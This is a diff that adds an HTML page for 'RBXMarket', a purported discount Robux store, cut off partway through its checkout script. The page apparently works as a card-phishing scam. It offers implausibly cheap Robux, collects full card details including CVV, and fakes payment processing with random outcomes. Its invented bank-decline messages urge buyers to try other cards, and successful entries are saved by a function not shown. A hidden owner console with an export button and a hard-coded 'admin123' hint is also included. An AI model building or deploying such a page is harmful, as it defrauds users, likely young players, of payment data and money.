@@ -1,0 +1,1488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RBXMarket - Buy Robux Securely</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1f36 0%, #0d1120 100%);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            margin-bottom: 40px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            font-size: 28px;
+            font-weight: 800;
+            color: #00bbff;
+        }
+        
+        .logo-icon {
+            background: #00bbff;
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 24px;
+        }
+        
+        .nav {
+            display: flex;
+            gap: 30px;
+            align-items: center;
+        }
+        
+        .nav a {
+            color: #a0aec0;
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.3s;
+        }
+        
+        .nav a:hover {
+            color: #00bbff;
+        }
+        
+        .cart-icon {
+            position: relative;
+            cursor: pointer;
+            font-size: 20px;
+        }
+        
+        .cart-count {
+            position: absolute;
+            top: -10px;
+            right: -10px;
+            background: #00ff88;
+            color: #0d1120;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            font-size: 12px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 40px 20px;
+            margin-bottom: 50px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            border: 1px solid rgba(0,187,255,0.2);
+        }
+        
+        .hero h1 {
+            font-size: 42px;
+            margin-bottom: 20px;
+            background: linear-gradient(90deg, #00bbff, #0088cc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .hero p {
+            color: #a0aec0;
+            font-size: 18px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        /* Products Grid */
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+            margin-bottom: 50px;
+        }
+        
+        .product-card {
+            background: rgba(255,255,255,0.05);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid rgba(255,255,255,0.1);
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .product-card:hover {
+            transform: translateY(-5px);
+            border-color: #00bbff;
+            box-shadow: 0 10px 30px rgba(0,187,255,0.2);
+        }
+        
+        .product-card.popular::before {
+            content: "MOST POPULAR";
+            position: absolute;
+            top: 15px;
+            right: -30px;
+            background: #00bbff;
+            color: white;
+            padding: 5px 30px;
+            transform: rotate(45deg);
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .product-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .product-name {
+            font-size: 20px;
+            font-weight: 600;
+        }
+        
+        .product-badge {
+            background: rgba(0,187,255,0.2);
+            color: #00bbff;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .robux-amount {
+            font-size: 36px;
+            font-weight: 800;
+            color: #00ff88;
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .robux-icon {
+            font-size: 24px;
+        }
+        
+        .price {
+            font-size: 24px;
+            color: #fff;
+            margin-bottom: 10px;
+        }
+        
+        .per-robux {
+            font-size: 14px;
+            color: #a0aec0;
+            margin-bottom: 15px;
+        }
+        
+        .features {
+            list-style: none;
+            margin: 20px 0;
+        }
+        
+        .features li {
+            padding: 8px 0;
+            color: #a0aec0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        
+        .features li::before {
+            content: "✓";
+            color: #00ff88;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .buy-btn, .add-to-cart-btn {
+            flex: 1;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: none;
+        }
+        
+        .buy-btn {
+            background: linear-gradient(90deg, #00bbff, #0088cc);
+            color: white;
+        }
+        
+        .add-to-cart-btn {
+            background: rgba(255,255,255,0.1);
+            color: white;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        
+        .buy-btn:hover {
+            background: linear-gradient(90deg, #0088cc, #006699);
+            transform: scale(1.02);
+        }
+        
+        .add-to-cart-btn:hover {
+            background: rgba(0,187,255,0.2);
+            border-color: #00bbff;
+        }
+        
+        /* Shopping Cart */
+        .cart-sidebar {
+            position: fixed;
+            top: 0;
+            right: -400px;
+            width: 380px;
+            height: 100vh;
+            background: #1a1f36;
+            border-left: 1px solid rgba(0,187,255,0.3);
+            padding: 30px;
+            overflow-y: auto;
+            transition: right 0.3s ease;
+            z-index: 1001;
+        }
+        
+        .cart-sidebar.active {
+            right: 0;
+        }
+        
+        .cart-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .close-cart {
+            background: none;
+            border: none;
+            color: #a0aec0;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        
+        .cart-items {
+            margin-bottom: 30px;
+        }
+        
+        .cart-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        
+        .cart-item-info h4 {
+            color: #00bbff;
+            margin-bottom: 5px;
+        }
+        
+        .cart-item-info p {
+            color: #a0aec0;
+            font-size: 14px;
+        }
+        
+        .cart-item-actions {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .quantity-btn {
+            background: rgba(255,255,255,0.1);
+            border: none;
+            color: white;
+            width: 25px;
+            height: 25px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        
+        .remove-item {
+            background: rgba(255,50,50,0.1);
+            border: none;
+            color: #ff3232;
+            padding: 5px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        
+        .cart-total {
+            background: rgba(255,255,255,0.05);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .total-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+        
+        .total-row.final {
+            font-size: 20px;
+            font-weight: bold;
+            color: #00ff88;
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .checkout-btn {
+            background: linear-gradient(90deg, #00ff88, #00cc66);
+            color: #0d1120;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+        }
+        
+        .checkout-btn:hover {
+            background: linear-gradient(90deg, #00cc66, #00aa44);
+            transform: scale(1.02);
+        }
+        
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background: #1a1f36;
+            border-radius: 20px;
+            padding: 30px;
+            width: 90%;
+            max-width: 500px;
+            border: 1px solid rgba(0,187,255,0.3);
+            position: relative;
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: none;
+            color: #a0aec0;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        
+        .modal h2 {
+            margin-bottom: 20px;
+            color: #00bbff;
+        }
+        
+        .modal p {
+            color: #a0aec0;
+            margin-bottom: 30px;
+        }
+        
+        /* Form */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #a0aec0;
+            font-weight: 600;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: #00bbff;
+        }
+        
+        textarea.form-control {
+            min-height: 100px;
+            resize: vertical;
+        }
+        
+        .form-row {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .form-row .form-group {
+            flex: 1;
+        }
+        
+        .payment-icons {
+            display: flex;
+            gap: 15px;
+            margin-top: 10px;
+        }
+        
+        .payment-icons i {
+            font-size: 24px;
+        }
+        
+        .submit-btn {
+            background: linear-gradient(90deg, #00ff88, #00cc66);
+            color: #0d1120;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            margin-top: 20px;
+        }
+        
+        .submit-btn:hover {
+            background: linear-gradient(90deg, #00cc66, #00aa44);
+            transform: scale(1.02);
+        }
+        
+        .success-message {
+            background: rgba(0,255,136,0.1);
+            border: 1px solid #00ff88;
+            color: #00ff88;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+            text-align: center;
+        }
+        
+        .error-message {
+            background: rgba(255,50,50,0.1);
+            border: 1px solid #ff3232;
+            color: #ff3232;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+            text-align: center;
+        }
+        
+        .modal-tabs {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .tab-btn {
+            padding: 10px 20px;
+            background: none;
+            border: none;
+            color: #a0aec0;
+            cursor: pointer;
+            font-weight: 600;
+            border-bottom: 3px solid transparent;
+        }
+        
+        .tab-btn.active {
+            color: #00bbff;
+            border-bottom-color: #00bbff;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        /* Owner Console */
+        .owner-console {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.9);
+            border: 2px solid #00bbff;
+            border-radius: 10px;
+            padding: 15px;
+            width: 350px;
+            max-height: 300px;
+            overflow-y: auto;
+            z-index: 9999;
+            font-size: 12px;
+            display: none;
+        }
+        
+        .owner-console-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            color: #00bbff;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        .console-log {
+            color: #00ff88;
+            font-family: monospace;
+            margin: 5px 0;
+            padding: 3px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .console-error {
+            color: #ff3232;
+        }
+        
+        .owner-toggle {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: #00bbff;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            cursor: pointer;
+            z-index: 10000;
+            font-weight: bold;
+            display: none;
+            box-shadow: 0 0 10px rgba(0,187,255,0.5);
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 30px 20px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            margin-top: 50px;
+            color: #a0aec0;
+            font-size: 14px;
+        }
+        
+        @media (max-width: 768px) {
+            .header {
+                flex-direction: column;
+                gap: 20px;
+            }
+            
+            .hero h1 {
+                font-size: 32px;
+            }
+            
+            .products-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .cart-sidebar {
+                width: 100%;
+                right: -100%;
+            }
+            
+            .cart-sidebar.active {
+                right: 0;
+            }
+            
+            .owner-console {
+                width: 90%;
+                right: 5%;
+                bottom: 80px;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Owner Toggle Button -->
+    <button class="owner-toggle" id="ownerToggle" onclick="toggleOwnerConsole()">
+        <i class="fas fa-user-secret"></i>
+    </button>
+    
+    <!-- Owner Console -->
+    <div class="owner-console" id="ownerConsole">
+        <div class="owner-console-header">
+            <span>RBXMarket Admin Console</span>
+            <div>
+                <button onclick="exportOwnerData()" style="background:#00bbff;color:white;border:none;padding:3px 8px;border-radius:3px;font-size:10px;margin-right:5px;cursor:pointer;">Export</button>
+                <button onclick="clearConsole()" style="background:none;border:none;color:#a0aec0;cursor:pointer;">X</button>
+            </div>
+        </div>
+        <div id="consoleLogs">
+            <div class="console-log">Console ready. Type 'admin123' in browser console to enable owner features.</div>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">
+                <div class="logo-icon">R$</div>
+                <span>RBXMarket</span>
+            </div>
+            <div class="nav">
+                <a href="#home">Home</a>
+                <a href="#prices">Prices</a>
+                <a href="#" onclick="openSupport()">Support</a>
+                <div class="cart-icon" onclick="toggleCart()">
+                    <i class="fas fa-shopping-cart"></i>
+                    <span class="cart-count" id="cartCount">0</span>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Hero -->
+        <div class="hero" id="home">
+            <h1>Get More Robux, Pay Less</h1>
+            <p>Instant delivery • Secure payment • 24/7 Support • Best rates guaranteed</p>
+        </div>
+        
+        <!-- Products -->
+        <div class="products-grid" id="prices">
+            <!-- Product 1 - Starter Pack: 9.99 (20x original: 400 Robux) -->
+            <div class="product-card">
+                <div class="product-header">
+                    <div class="product-name">Starter Pack</div>
+                    <div class="product-badge">NEW</div>
+                </div>
+                <div class="robux-amount">
+                    <span class="robux-icon">🅧</span> 8,000
+                </div>
+                <div class="price">$9.99</div>
+                <div class="per-robux">$0.00125 per Robux</div>
+                <ul class="features">
+                    <li>Instant delivery within minutes</li>
+                    <li>Perfect for new players</li>
+                    <li>Basic avatar items</li>
+                    <li>Email delivery</li>
+                </ul>
+                <div class="action-buttons">
+                    <button class="buy-btn" onclick="openCheckout(8000, 9.99, 'Starter Pack')">
+                        BUY NOW
+                    </button>
+                    <button class="add-to-cart-btn" onclick="addToCart(8000, 9.99, 'Starter Pack')">
+                        ADD TO CART
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Product 2 - Pro Bundle: 19.99 (20x original: 1,000 Robux) -->
+            <div class="product-card popular">
+                <div class="product-header">
+                    <div class="product-name">Pro Bundle</div>
+                    <div class="product-badge">BEST VALUE</div>
+                </div>
+                <div class="robux-amount">
+                    <span class="robux-icon">🅧</span> 20,000
+                </div>
+                <div class="price">$19.99</div>
+                <div class="per-robux">$0.001 per Robux</div>
+                <ul class="features">
+                    <li>Save 20% compared to Starter</li>
+                    <li>Most popular choice</li>
+                    <li>Game passes & clothing</li>
+                    <li>Priority support</li>
+                    <li>Instant delivery</li>
+                </ul>
+                <div class="action-buttons">
+                    <button class="buy-btn" onclick="openCheckout(20000, 19.99, 'Pro Bundle')">
+                        BUY NOW
+                    </button>
+                    <button class="add-to-cart-btn" onclick="addToCart(20000, 19.99, 'Pro Bundle')">
+                        ADD TO CART
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Product 3 - Premium: 49.99 (20x original: 2,750 Robux) -->
+            <div class="product-card">
+                <div class="product-header">
+                    <div class="product-name">Premium</div>
+                    <div class="product-badge">LIMITED</div>
+                </div>
+                <div class="robux-amount">
+                    <span class="robux-icon">🅧</span> 55,000
+                </div>
+                <div class="price">$49.99</div>
+                <div class="per-robux">$0.00091 per Robux</div>
+                <ul class="features">
+                    <li>Save 30% compared to Starter</li>
+                    <li>Premium items access</li>
+                    <li>Limited items included</li>
+                    <li>Game development funds</li>
+                    <li>VIP support</li>
+                </ul>
+                <div class="action-buttons">
+                    <button class="buy-btn" onclick="openCheckout(55000, 49.99, 'Premium')">
+                        BUY NOW
+                    </button>
+                    <button class="add-to-cart-btn" onclick="addToCart(55000, 49.99, 'Premium')">
+                        ADD TO CART
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Product 4 - Ultimate: 99.99 (20x original: 10,000 Robux) -->
+            <div class="product-card">
+                <div class="product-header">
+                    <div class="product-name">Ultimate</div>
+                    <div class="product-badge">ULTIMATE</div>
+                </div>
+                <div class="robux-amount">
+                    <span class="robux-icon">🅧</span> 200,000
+                </div>
+                <div class="price">$99.99</div>
+                <div class="per-robux">$0.0005 per Robux</div>
+                <ul class="features">
+                    <li>Save 40% compared to Starter</li>
+                    <li>Maximum value</li>
+                    <li>Start your own game business</li>
+                    <li>All premium features</li>
+                    <li>Dedicated account manager</li>
+                </ul>
+                <div class="action-buttons">
+                    <button class="buy-btn" onclick="openCheckout(200000, 99.99, 'Ultimate')">
+                        BUY NOW
+                    </button>
+                    <button class="add-to-cart-btn" onclick="addToCart(200000, 99.99, 'Ultimate')">
+                        ADD TO CART
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Shopping Cart Sidebar -->
+        <div class="cart-sidebar" id="cartSidebar">
+            <div class="cart-header">
+                <h2><i class="fas fa-shopping-cart"></i> Your Cart</h2>
+                <button class="close-cart" onclick="toggleCart()">&times;</button>
+            </div>
+            
+            <div class="cart-items" id="cartItems">
+                <p style="text-align: center; color: #a0aec0; padding: 20px;">Your cart is empty</p>
+            </div>
+            
+            <div class="cart-total">
+                <div class="total-row">
+                    <span>Subtotal:</span>
+                    <span id="cartSubtotal">$0.00</span>
+                </div>
+                <div class="total-row">
+                    <span>Tax (10%):</span>
+                    <span id="cartTax">$0.00</span>
+                </div>
+                <div class="total-row final">
+                    <span>Total:</span>
+                    <span id="cartTotal">$0.00</span>
+                </div>
+            </div>
+            
+            <button class="checkout-btn" onclick="checkoutCart()">
+                <i class="fas fa-lock"></i> CHECKOUT
+            </button>
+        </div>
+        
+        <!-- Support/Checkout Modal -->
+        <div id="mainModal" class="modal">
+            <div class="modal-content">
+                <button class="close-modal" onclick="closeModal()">&times;</button>
+                
+                <div class="modal-tabs">
+                    <button class="tab-btn active" onclick="switchTab('checkout')">Checkout</button>
+                    <button class="tab-btn" onclick="switchTab('support')">Support</button>
+                </div>
+                
+                <!-- Checkout Tab -->
+                <div id="checkoutTab" class="tab-content active">
+                    <h2>Complete Your Purchase</h2>
+                    <p>You're buying <span id="selectedRobux" style="color:#00ff88;font-weight:bold;">0</span> Robux for $<span id="selectedPrice" style="color:#00ff88;font-weight:bold;">0.00</span></p>
+                    
+                    <form id="checkoutForm">
+                        <div class="form-group">
+                            <label>Email Address</label>
+                            <input type="email" class="form-control" id="checkoutEmail" placeholder="your@email.com" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Roblox Username</label>
+                            <input type="text" class="form-control" id="checkoutUsername" placeholder="Enter your Roblox username" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Card Number</label>
+                            <input type="text" class="form-control" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                            <div class="payment-icons">
+                                <i class="fab fa-cc-visa" style="color:#1a1f8e;"></i>
+                                <i class="fab fa-cc-mastercard" style="color:#eb001b;"></i>
+                                <i class="fab fa-cc-amex" style="color:#2e77bc;"></i>
+                                <i class="fab fa-cc-discover" style="color:#ff6000;"></i>
+                            </div>
+                        </div>
+                        
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Expiry Date</label>
+                                <input type="text" class="form-control" id="cardExpiry" placeholder="MM/YY" maxlength="5" required>
+                            </div>
+                            <div class="form-group">
+                                <label>CVV</label>
+                                <input type="text" class="form-control" id="cardCVV" placeholder="123" maxlength="4" required>
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Name on Card</label>
+                            <input type="text" class="form-control" id="cardName" placeholder="Full Name" required>
+                        </div>
+                        
+                        <button type="submit" class="submit-btn">
+                            <i class="fas fa-lock"></i> PAY $<span id="submitPrice">0.00</span>
+                        </button>
+                        
+                        <div class="success-message" id="successMessage">
+                            <i class="fas fa-check-circle"></i> 
+                            <span id="successText">Payment successful! Robux will be delivered within 5 minutes.</span>
+                        </div>
+                        
+                        <div class="error-message" id="errorMessage">
+                            <i class="fas fa-exclamation-triangle"></i> 
+                            <span id="errorText">Payment failed. Please check your card details and try again.</span>
+                        </div>
+                    </form>
+                </div>
+                
+                <!-- Support Tab -->
+                <div id="supportTab" class="tab-content">
+                    <h2>Contact Support</h2>
+                    <p>Have questions or issues? Send us a message and we'll get back to you within 24 hours.</p>
+                    
+                    <form id="supportForm">
+                        <div class="form-group">
+                            <label>Your Name</label>
+                            <input type="text" class="form-control" id="supportName" placeholder="Enter your name" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Email Address</label>
+                            <input type="email" class="form-control" id="supportEmail" placeholder="your@email.com" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Subject</label>
+                            <input type="text" class="form-control" id="supportSubject" placeholder="What is this regarding?" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Message</label>
+                            <textarea class="form-control" id="supportMessage" placeholder="Describe your issue or question in detail..." required></textarea>
+                        </div>
+                        
+                        <button type="submit" class="submit-btn">
+                            <i class="fas fa-paper-plane"></i> SEND MESSAGE
+                        </button>
+                        
+                        <div class="success-message" id="supportSuccess">
+                            <i class="fas fa-check-circle"></i> 
+                            <span>Message sent successfully! We'll respond within 24 hours.</span>
+                        </div>
+                        
+                        <div class="error-message" id="supportError">
+                            <i class="fas fa-exclamation-triangle"></i> 
+                            <span>Failed to send message. Please try again.</span>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <p>© 2024 RBXMarket. Not affiliated with Roblox Corporation. All transactions are secure and encrypted.</p>
+            <p style="margin-top: 10px;">
+                <a href="#" style="color:#a0aec0;margin:0 10px;">Terms of Service</a> | 
+                <a href="#" style="color:#a0aec0;margin:0 10px;">Privacy Policy</a> | 
+                <a href="#" style="color:#a0aec0;margin:0 10px;">Refund Policy</a>
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // =============================
+        // SIMPLE VERSION - NO BROKEN CODE
+        // =============================
+        
+        // Global variables
+        let cart = [];
+        let currentRobux = 0;
+        let currentPrice = 0;
+        let currentProduct = "";
+        let isOwnerMode = false;
+        
+        // Initialize
+        function init() {
+            console.log("RBXMarket loaded successfully!");
+            
+            // Check for saved cart
+            const savedCart = localStorage.getItem('rbxmarket_cart');
+            if (savedCart) {
+                cart = JSON.parse(savedCart);
+                updateCartDisplay();
+            }
+            
+            // Setup event listeners
+            setupEventListeners();
+            
+            // Enable owner mode if key exists
+            if (localStorage.getItem('rbxmarket_owner') === 'true') {
+                enableOwnerMode();
+            }
+        }
+        
+        // Setup event listeners
+        function setupEventListeners() {
+            // Checkout form
+            document.getElementById('checkoutForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                processCheckout();
+            });
+            
+            // Support form
+            document.getElementById('supportForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                processSupport();
+            });
+            
+            // Card formatting
+            document.getElementById('cardNumber').addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                let formatted = value.replace(/(\d{4})/g, '$1 ').trim();
+                e.target.value = formatted.substring(0, 19);
+            });
+            
+            document.getElementById('cardExpiry').addEventListener('input', function(e) {
+                let value = e.target.value.replace(/[^0-9]/g, '');
+                if (value.length >= 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                }
+                e.target.value = value.substring(0, 5);
+            });
+            
+            // Close modal on outside click
+            window.addEventListener('click', function(e) {
+                if (e.target.id === 'mainModal') {
+                    closeModal();
+                }
+            });
+            
+            // Escape key to close modals
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape') {
+                    closeModal();
+                    document.getElementById('cartSidebar').classList.remove('active');
+                    document.getElementById('ownerConsole').style.display = 'none';
+                }
+            });
+            
+            // Save cart periodically
+            setInterval(() => {
+                localStorage.setItem('rbxmarket_cart', JSON.stringify(cart));
+            }, 2000);
+        }
+        
+        // =============================
+        // CART FUNCTIONS
+        // =============================
+        function addToCart(robux, price, productName) {
+            const existingItem = cart.find(item => item.productName === productName);
+            
+            if (existingItem) {
+                existingItem.quantity += 1;
+            } else {
+                cart.push({
+                    robux: robux,
+                    price: price,
+                    productName: productName,
+                    quantity: 1
+                });
+            }
+            
+            updateCartDisplay();
+            showCartNotification();
+            console.log(`Added to cart: ${productName}`);
+        }
+        
+        function removeFromCart(index) {
+            cart.splice(index, 1);
+            updateCartDisplay();
+        }
+        
+        function updateQuantity(index, change) {
+            cart[index].quantity += change;
+            
+            if (cart[index].quantity < 1) {
+                removeFromCart(index);
+            } else {
+                updateCartDisplay();
+            }
+        }
+        
+        function updateCartDisplay() {
+            const cartItems = document.getElementById('cartItems');
+            const cartCount = document.getElementById('cartCount');
+            const cartSubtotal = document.getElementById('cartSubtotal');
+            const cartTax = document.getElementById('cartTax');
+            const cartTotal = document.getElementById('cartTotal');
+            
+            // Update cart count
+            const totalItems = cart.reduce((sum, item) => sum + item.quantity, 0);
+            cartCount.textContent = totalItems;
+            
+            // If cart is empty
+            if (cart.length === 0) {
+                cartItems.innerHTML = '<p style="text-align: center; color: #a0aec0; padding: 20px;">Your cart is empty</p>';
+                cartSubtotal.textContent = '$0.00';
+                cartTax.textContent = '$0.00';
+                cartTotal.textContent = '$0.00';
+                return;
+            }
+            
+            // Build cart items
+            let itemsHTML = '';
+            let subtotal = 0;
+            
+            cart.forEach((item, index) => {
+                const itemTotal = item.price * item.quantity;
+                subtotal += itemTotal;
+                
+                itemsHTML += `
+                    <div class="cart-item">
+                        <div class="cart-item-info">
+                            <h4>${item.productName}</h4>
+                            <p>${item.robux.toLocaleString()} Robux × ${item.quantity}</p>
+                            <p>$${item.price.toFixed(2)} each</p>
+                        </div>
+                        <div class="cart-item-actions">
+                            <button class="quantity-btn" onclick="updateQuantity(${index}, -1)">-</button>
+                            <span>${item.quantity}</span>
+                            <button class="quantity-btn" onclick="updateQuantity(${index}, 1)">+</button>
+                            <button class="remove-item" onclick="removeFromCart(${index})">Remove</button>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            cartItems.innerHTML = itemsHTML;
+            
+            // Calculate totals
+            const tax = subtotal * 0.10;
+            const total = subtotal + tax;
+            
+            cartSubtotal.textContent = `$${subtotal.toFixed(2)}`;
+            cartTax.textContent = `$${tax.toFixed(2)}`;
+            cartTotal.textContent = `$${total.toFixed(2)}`;
+        }
+        
+        function toggleCart() {
+            document.getElementById('cartSidebar').classList.toggle('active');
+        }
+        
+        function showCartNotification() {
+            const cartIcon = document.querySelector('.cart-icon');
+            cartIcon.style.transform = 'scale(1.2)';
+            setTimeout(() => {
+                cartIcon.style.transform = 'scale(1)';
+            }, 300);
+        }
+        
+        function checkoutCart() {
+            if (cart.length === 0) {
+                alert('Your cart is empty!');
+                return;
+            }
+            
+            // Calculate cart total
+            const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            const tax = subtotal * 0.10;
+            const total = subtotal + tax;
+            const totalRobux = cart.reduce((sum, item) => sum + (item.robux * item.quantity), 0);
+            
+            // Set checkout values
+            currentRobux = totalRobux;
+            currentPrice = total;
+            currentProduct = 'Cart Items';
+            
+            document.getElementById('selectedRobux').textContent = totalRobux.toLocaleString();
+            document.getElementById('selectedPrice').textContent = total.toFixed(2);
+            document.getElementById('submitPrice').textContent = total.toFixed(2);
+            
+            // Open checkout modal
+            switchTab('checkout');
+            openModal();
+            
+            // Clear messages
+            document.getElementById('successMessage').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
+        }
+        
+        // =============================
+        // CHECKOUT FUNCTIONS
+        // =============================
+        function openCheckout(robux, price, productName) {
+            currentRobux = robux;
+            currentPrice = price;
+            currentProduct = productName;
+            
+            document.getElementById('selectedRobux').textContent = robux.toLocaleString();
+            document.getElementById('selectedPrice').textContent = price.toFixed(2);
+            document.getElementById('submitPrice').textContent = price.toFixed(2);
+            
+            switchTab('checkout');
+            openModal();
+            
+            document.getElementById('successMessage').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
+        }
+        
+        function processCheckout() {
+            const isSuccess = Math.random() > 0.5;
+            
+            if (isSuccess) {
+                // Show success
+                document.getElementById('successMessage').style.display = 'block';
+                document.getElementById('errorMessage').style.display = 'none';
+                
+                // Save transaction data
+                saveTransactionData();
+                
+                // Clear cart if from cart
+                if (cart.length > 0) {
+                    cart = [];
+                    updateCartDisplay();
+                    toggleCart();
+                }
+                
+                // Close modal after 3 seconds
+                setTimeout(() => {
+                    closeModal();
+                    document.getElementById('checkoutForm').reset();
+                }, 3000);
+            } else {
+                // Show error
+                const errorMessages = [
+                    "Card declined. Please try a different payment method.",
+                    "Insufficient funds. Please check your account balance.",
+                    "Security check failed. Please contact your bank.",
+                    "Invalid card number. Please verify your card details.",
+                    "Transaction timed out. Please try again in a few minutes.",
+                    "Payment processor error. Please try another card.",
+                    "3D Secure authentication failed. Please contact your bank.",
+                    "Daily transaction limit exceeded. Please try tomorrow."
+                ];
+                
+                const randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+                document.getElementById('errorText').textContent = randomError;
+                document.getElementById('errorMessage').style.display = 'block';
+                document.getElementById('successMessage').style.display = 'none';
